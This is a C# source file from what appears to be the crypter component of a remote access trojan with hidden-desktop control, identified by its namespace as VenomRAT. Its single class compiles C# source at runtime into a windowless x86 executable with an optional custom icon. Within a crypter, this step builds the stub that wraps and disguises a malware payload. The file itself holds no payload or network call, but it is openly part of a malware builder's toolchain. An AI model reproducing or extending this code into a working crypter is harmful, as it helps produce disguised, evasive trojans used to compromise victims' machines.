using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Windows.Forms;

namespace VenomRAT_HVNC.Crypter.Settings
{
    public class Compiler
    {
        public static void CompileCSharpFile(string inputFileCs, string outputPathExe, string icon = null)
        {
            // Create a new compiler instance
            CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");

            // Set the parameters for the compiler
            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = outputPathExe;
            parameters.CompilerOptions = "/target:winexe /platform:x86"; // Removed trailing space

            if (!string.IsNullOrEmpty(icon))
            {
                parameters.CompilerOptions += $" /win32icon:\"{icon}\"";
            }

            // Add any additional references or imports that are required
            parameters.ReferencedAssemblies.AddRange(new string[]
            {
                "System.dll",
                "System.Core.dll",
                "mscorlib.dll",
                "System.IO.Compression.dll",
                "System.IO.Compression.FileSystem.dll", // Ajout de cette ligne
                "System.Reflection.dll",
                "System.Security.dll"
            });
            parameters.TreatWarningsAsErrors = false;
            parameters.IncludeDebugInformation = false;

            // Compile the code
            CompilerResults results = provider.CompileAssemblyFromSource(parameters, inputFileCs);

            // Check for any errors
            if (results.Errors.Count > 0)
            {
                string errorMessage = "Error compiling assembly:\n\n";
                foreach (CompilerError error in results.Errors)
                {
                    errorMessage += $"{error.ErrorText} (Line {error.Line}, Column {error.Column})\n";
                }

                MessageBox.Show(errorMessage, "Compilation Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}